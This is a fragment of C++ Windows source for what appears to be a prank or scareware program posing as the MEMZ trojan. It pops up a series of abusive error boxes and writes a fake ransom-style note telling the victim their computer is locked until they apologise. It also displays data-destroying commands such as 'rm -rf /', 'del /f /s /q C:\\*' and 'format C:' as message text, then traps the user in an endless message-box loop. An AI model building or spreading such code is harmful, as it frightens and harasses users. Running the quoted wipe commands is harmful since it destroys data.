	MessageBoxA(hWnd, "Do you know the MEMZ?", "Fuck you", MB_ICONERROR);
	MessageBoxA(hWnd, "Do you want to enjoy it?", "Fuck you", MB_ICONERROR);
	MessageBoxA(hWnd, "Let's go!", "Fuck you", MB_ICONERROR);
	{
		fstream fp("./cmysnake/" + GetCurrentUserSecurityId() + "/note.txt", ios::out);
		fp << "Your computer is FUCKED by the MEMZ trojan." << endl <<
			"You must say \"sorry\" to the author to unlock your computer." << endl;
		fp.close();
		Process.StartOnly(L"notepad ./cmysnake/" + s2ws(GetCurrentUserSecurityId())
			+ L"/note.txt");
	}
	MessageBoxA(hWnd, "Say sorry to me!!", "Fuck you", MB_ICONERROR);
	MessageBoxA(hWnd, "Say sorry to me!!", "Fuck you", MB_ICONERROR);
	MessageBoxA(hWnd, "Say sorry to me!!", "Fuck you", MB_ICONERROR);
	MessageBoxA(hWnd, "Say sorry to me!!", "Fuck you", MB_ICONERROR);
	MessageBoxA(hWnd, "Say sorry to me!!", "Fuck you", MB_ICONERROR);
	MessageBoxA(hWnd, "Say sorry to me!!", "Fuck you", MB_ICONERROR);
	MessageBoxA(hWnd, "Say sorry to me!!", "Fuck you", MB_ICONERROR);
	MessageBoxA(hWnd, "Say sorry to me!!", "Fuck you", MB_ICONERROR);
	MessageBoxA(hWnd, "Say sorry to me!!", "Fuck you", MB_ICONERROR);
	MessageBoxA(hWnd, "Say sorry to me!!", "Fuck you", MB_ICONERROR);
	MessageBoxA(hWnd, "/kill @p", "Fuck you", MB_ICONERROR);
	MessageBoxA(hWnd, "/kick @p", "Fuck you", MB_ICONERROR);
	MessageBoxA(hWnd, "/ban @p", "Fuck you", MB_ICONERROR);
	MessageBoxA(hWnd, "/ban-ip @p", "Fuck you", MB_ICONERROR);
	MessageBoxA(hWnd, "/boom @p", "Fuck you", MB_ICONERROR);
	MessageBoxA(hWnd, "rm -rf /", "Fuck you", MB_ICONERROR);
	MessageBoxA(hWnd, "del /f /s /q C:\\*", "Fuck you", MB_ICONERROR);
	MessageBoxA(hWnd, "rd /s /q C:\\*", "Fuck you", MB_ICONERROR);
	MessageBoxA(hWnd, "format C:", "Fuck you", MB_ICONERROR);
	if (MessageBoxA(hWnd, "Say sorry to me!!", "Fuck you", MB_ICONERROR | MB_YESNO)
		== IDYES) exit(0);
	while (1) {
		MessageBoxA(hWnd, "FUCK YOU", "Fuck you", MB_ICONERROR);
	}
}
